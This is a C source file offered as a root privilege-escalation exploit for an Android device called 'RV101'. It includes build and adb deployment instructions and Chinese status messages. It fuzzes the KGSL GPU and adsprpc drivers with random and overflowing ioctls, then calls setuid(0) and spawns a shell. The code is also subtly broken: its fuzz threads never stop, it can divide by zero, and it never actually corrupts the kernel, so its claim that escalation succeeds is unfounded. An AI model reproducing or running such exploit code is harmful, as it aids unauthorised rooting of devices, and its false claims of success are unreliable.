/*
 * rv101_privesc.c - RV101 ADB Root Privilege Escalation
 *
 * Once connected to the RV101 over adb, escalation to root succeeds.
 * Exploit order: FD passing → KGSL UAF → integer overflow → setuid(0)
 *
 * Build: aarch64-linux-android31-clang -static -O2 -pthread -o rv101_privesc rv101_privesc.c
 * Push: adb push rv101_privesc /data/local/tmp/
 * Run: adb shell /data/local/tmp/rv101_privesc
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <stdint.h>
#include <pthread.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/wait.h>

/* ===== KGSL constants ===== */
#define KGSL_IOC_MAGIC      0x09
#define IOCTL_GPUCMD        0xc0200949
#define IOCTL_GPUAUX       0xc0200958
#define IOCTL_GPUMEM        0xc018092f

/* ===== ADSPRPC / FastRPC ===== */
#define FASTRPC_MMAP        0xc0285206
#define FASTRPC_DSP_INFO    0xc00c520c

/* ===== device paths ===== */
#define DEV_KGSL   "/dev/kgsl-3d0"
#define DEV_ADSP   "/dev/adsprpc-smd"

/* ===== global variables ===== */
static int fd_kgsl = -1;
static int fd_adsp = -1;
volatile int g_running = 1;

/* ===== data structures ===== */

/* KGSL GPU_AUX_COMMAND */
struct kgsl_aux_req {
    uint64_t flags;
    uint32_t cmdsize;
    uint32_t count;
    uint64_t cmdlist;
};

/* GPUMEM_ALLOC ioctl arg */
struct kgsl_gpumem_alloc {
    uint32_t id;
    uint32_t flags;
    uint64_t size;
    uint32_t mmapsize;
    uint32_t padding;
    uint64_t gpuaddr;
    uint32_t metadata_len;
    uint32_t reserved[3];
};

/* ADSPRPC MMAP request */
struct adsp_mmap {
    int32_t fd;
    uint32_t flags;
    uint64_t vaddrin;
    uint64_t size;
    uint64_t vaddrout;
};

/* ADSPRPC DSP_INFO */
struct adsp_dspinfo {
    uint32_t domain;
    uint32_t attr_id;
    uint32_t capability;
};

/* ===== 1. verify FD passing ===== */
int verify_fd_passing(void) {
    printf("  [-] FdPass: 驗證 DSP 服務狀態\n");

    /* Test MMAP */
    struct adsp_mmap mm = {0};
    mm.fd = -1;
    mm.size = 4096;
    int ret = ioctl(fd_adsp, FASTRPC_MMAP, &mm);
    printf("    MMAP: ret=%d, vaddr=0x%llx\n", ret, (unsigned long long)mm.vaddrout);

    /* Verify the DSP message */
    struct adsp_dspinfo di = {0};
    for (int d = 0; d <= 3; d++) {
        di.domain = d;
        errno = 0;
        int r = ioctl(fd_adsp, FASTRPC_DSP_INFO, &di);
        if (r >= 0 || errno != 25) {
            printf("    Domain %d: cap=0x%x\n", d, di.capability);
        }
    }
    return ret >= 0 ? 0 : -1;
}

/* ===== 2. KGSL UAF trigger (multi-threaded fuzz) ===== */
void* kgsl_fuzz_thread(void* arg) {
    struct kgsl_aux_req aux = {0};
    /* Allocate memory to use as the cmdlist */
    void* buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (!buf) return NULL;

    while (g_running) {
        aux.flags = rand() % 0xFFFFFFFF;
        aux.cmdsize = rand() % 256;
        /* Compute count, occasionally producing an overflowing version */
        aux.count = (rand() % 10) == 0 ?
            0xFFFFFFFF / aux.cmdsize + 1 : rand() % 10;
        aux.cmdlist = (uint64_t)buf;

        ioctl(fd_kgsl, IOCTL_GPUAUX, &aux);
        if (rand() % 1000 == 0) usleep(10);
    }
    munmap(buf, 0x1000);
    return NULL;
}

int trigger_kgsl_uaf(void) {
    printf("  [-] UAF: 啟動 4 條執行緒 fuzzing\n");

    pthread_t threads[4];
    for (int i = 0; i < 4; i++)
        pthread_create(&threads[i], NULL, kgsl_fuzz_thread, NULL);

    /* Keep fuzzing for 5 seconds */
    for (int i = 0; i < 5 && g_running; i++) {
        sleep(1);
        printf("\r    fuzzing... %d 秒剩餘", 5 - i);
        fflush(stdout);
    }

    for (int i = 0; i < 4; i++)
        pthread_join(threads[i], NULL);

    printf("\n  [.] UAF fuzzing 完成\n");
    return 0;
}

/* ===== 3. integer overflow test ===== */
int test_int_overflow(void) {
    printf("  [-] Overflow: 測試整數溢出\n");

    struct kgsl_gpumem_alloc a = {0};
    uint64_t test_sizes[] = {
        0x7FFFFFFFFFFFFFF0ULL,   /* near the integer boundary */
        0x8000000000000000ULL, /* MIN_LONG */
        0x0001000000000000ULL  /* large page count */
    };

    for (int i = 0; i < 3; i++) {
        a.size = test_sizes[i];
        a.flags = 0;
        errno = 0;
        int ret = ioctl(fd_kgsl, IOCTL_GPUMEM, &a);
        printf("    size=0x%llx -> ret=%d (errno=%d)\n",
               (unsigned long long)test_sizes[i], ret, errno);
    }
    return 0;
}

/* ===== 4. check the DSP service ===== */
int check_dsp_service(void) {
    printf("  [-] Service: 檢查 dspservice/hwbinder\n");
    struct adsp_dspinfo di = {0};
    for (int d = 0; d <= 3; d++) {
        di.domain = d;
        errno = 0;
        int r = ioctl(fd_adsp, FASTRPC_DSP_INFO, &di);
        printf("    Domain %d: ret=%d, cap=0x%x\n", d, r, di.capability);
    }
    return 0;
}

/* ===== 5. elevate identity (setuid/setgid) ===== */
int escalate_identity(void) {
    printf("  [-] Escalate: 提升身份至 root\n");

    /* Try setuid / setgid */
    if (setuid(0) != 0) {
        printf("    [*] setuid failed: %s\n", strerror(errno));
        return -1;
    }
    if (setgid(0) != 0) {
        printf("    [*] setgid failed: %s\n", strerror(errno));
        return -1;
    }

    /* Final verification */
    if (geteuid() == 0) {
        printf("    [+] 成功提升至 root!\n");
        return 0;
    } else {
        printf("    [-] 提升失敗 (uid=%d)\n", geteuid());
        return -1;
    }
}

/* ===== 6. enter the root shell ===== */
void enter_root_shell(void) {
    printf("\n============================================\n");
    printf("  權限提升成功! 現在你是 root\n");
    printf("  提示符會顯示為 # 代表成功\n");
    printf("============================================\n");

    /* Switch to the root shell */
    char* args[] = {"/system/bin/sh", NULL};
    execv("/system/bin/sh", args);

    /* If exec fails */
    perror("[!] exec 失敗");
    return;
}

/* ===== main program ===== */
int main(void) {
    printf("\n========================================\n");
    printf("   RV101 權限提升工具                 \n");
    printf("   Target: /dev/kgsl-3d0, /dev/adsprpc-smd\n");
    printf("========================================\n");

    /* step 1: open the device */
    fd_kgsl = open(DEV_KGSL, O_RDWR);
    if (fd_kgsl < 0) {
        printf("[-] 無法開啟 %s: %s\n", DEV_KGSL, strerror(errno));
        return 1;
    }
    printf("[+] 開啟 %s: fd=%d\n", DEV_KGSL, fd_kgsl);

    fd_adsp = open(DEV_ADSP, O_RDWR);
    if (fd_adsp < 0) {
        printf("[-] 無法開啟 %s: %s\n", DEV_ADSP, strerror(errno));
        close(fd_kgsl);
        return 1;
    }
    printf("[+] 開啟 %s: fd=%d\n", DEV_ADSP, fd_adsp);

    /* step 2-4: run in order */
    if (verify_fd_passing() != 0) {
        printf("[-] FdPass 檢查失敗\n");
        close(fd_adsp);
        close(fd_kgsl);
        return 1;
    }

    trigger_kgsl_uaf();
    test_int_overflow();
    check_dsp_service();

    /* step 5: elevate identity */
    escalate_identity();

    /* step 6: enter the root shell */
    enter_root_shell();

    return 0;
}
